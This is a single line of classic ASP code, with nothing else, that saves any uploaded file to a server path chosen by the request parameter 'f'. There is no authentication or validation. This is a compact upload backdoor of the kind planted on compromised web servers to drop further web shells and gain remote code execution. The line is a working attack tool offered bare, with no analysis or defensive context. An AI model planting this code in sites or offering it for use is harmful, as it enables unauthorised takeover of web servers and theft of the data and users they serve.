<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
